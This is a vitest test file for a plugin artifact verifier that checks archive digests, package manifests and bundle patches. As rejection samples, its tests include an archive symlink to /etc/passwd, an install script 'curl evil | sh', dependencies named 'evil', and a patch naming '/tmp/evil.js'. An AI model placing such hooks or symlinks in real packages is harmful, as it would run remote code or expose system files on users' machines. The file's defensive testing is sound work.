import { afterEach, expect, it } from 'vitest'
import { mkdtemp, mkdir, writeFile, readFile, rm, symlink } from 'node:fs/promises'
import { join } from 'node:path'
import { tmpdir } from 'node:os'
import { createHash } from 'node:crypto'
import * as tar from 'tar'
import { assertBundleManifest, assertBundlePatch, verifyArtifact } from '../src/managed/artifact.ts'
import type { ManagedRelease } from '../src/managed/types.ts'
const paths: string[] = []
afterEach(async () => { await Promise.all(paths.splice(0).map(path => rm(path, { recursive: true, force: true }))) })
const metadata: ManagedRelease = { id: 'lawyer-test', packageName: '@lawyer-dsh/test', version: '1.0.0', name: 'Test', description: 'Test', category: 'Test', hostVersions: ['0.1.3-alpha.2'], artifact: { url: '', sha256: '', size: 0 } }
const manifest = { name: metadata.packageName, version: metadata.version, type: 'module', main: 'index.js', dsh: { bundle: { patch: './cordis.patch.yml' } } }
async function archive(link = false) {
  const root = await mkdtemp(join(tmpdir(), 'lawyer-artifact-test-')); paths.push(root)
  await mkdir(join(root, 'package'))
  await writeFile(join(root, 'package', 'package.json'), JSON.stringify(manifest))
  await writeFile(join(root, 'package', 'index.js'), 'export function apply() {}\n')
  await writeFile(join(root, 'package', 'cordis.patch.yml'), "- insert:\n    - id: lawyer-test\n      name: '@lawyer-dsh/test'\n")
  if (link) await symlink('/etc/passwd', join(root, 'package', 'escape'))
  const file = join(root, 'artifact.tgz')
  await tar.c({ file, cwd: root, gzip: true, portable: true }, ['package'])
  const bytes = await readFile(file)
  return { file, release: { ...metadata, artifact: { url: '', sha256: createHash('sha256').update(bytes).digest('hex'), size: bytes.length } } }
}
it('accepts actual tar bytes only when package, digest and bundle declarations agree', async () => {
  const { file, release } = await archive()
  await expect(verifyArtifact(file, release)).resolves.toBeUndefined()
  await expect(verifyArtifact(file, { ...release, version: '2.0.0' })).rejects.toThrow(/包名、版本/)
  await expect(verifyArtifact(file, { ...release, artifact: { ...release.artifact, sha256: '0'.repeat(64) } })).rejects.toThrow(/校验/)
})
it('rejects archive symlinks before extraction', async () => {
  const { file, release } = await archive(true)
  await expect(verifyArtifact(file, release)).rejects.toThrow(/安全解包/)
})
it('rejects implicit dependency downloads and installation scripts', () => {
  for (const extra of [{ dependencies: { evil: '*' } }, { optionalDependencies: { evil: '*' } }, { peerDependencies: { react: '*' } }, { scripts: { install: 'curl evil | sh' } }]) expect(() => assertBundleManifest({ ...manifest, ...extra }, metadata)).toThrow()
})
it('does not permit business bundles to overwrite model or market configuration', () => {
  expect(() => assertBundlePatch([{ id: 'llm-pi-ai', config: {} }], metadata.packageName)).toThrow()
  expect(() => assertBundlePatch([{ insert: [{ id: 'lawyer-platform', name: metadata.packageName }] }], metadata.packageName)).toThrow()
  expect(() => assertBundlePatch([{ insert: [{ id: 'lawyer-test', name: '/tmp/evil.js' }] }], metadata.packageName)).toThrow()
})
